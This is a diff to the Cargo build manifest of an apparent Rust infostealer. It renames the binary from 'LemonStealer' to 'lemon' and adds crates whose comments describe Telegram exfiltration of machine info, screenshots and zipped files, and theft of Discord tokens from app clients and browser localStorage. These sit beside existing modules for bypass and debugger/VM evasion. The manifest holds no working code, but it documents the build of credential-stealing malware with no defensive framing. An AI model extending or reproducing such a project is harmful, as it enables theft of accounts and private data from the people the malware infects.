@@ -5,7 +5,7 @@ edition.workspace = true
 license.workspace = true
 
 [[bin]]
-name = "LemonStealer"
+name = "lemon"
 path = "src/main.rs"
 
 [dependencies]
@@ -19,4 +19,9 @@ filemanager = { path = "../filemanager" }
 bypass = { path = "../bypass" }
 # Wave 3 evasion (debugger/VM probes) — unsafe+WinAPI lives only in abi.
 abi = { path = "../abi" }
+# Wave 7 Telegram exfil (machine info + screenshot + zip delivery).
+telegram = { path = "../telegram" }
+# Wave 8 Discord token steal (app clients + web localStorage).
+discord = { path = "../discord" }
 log = { workspace = true }
+serde_json = { workspace = true }
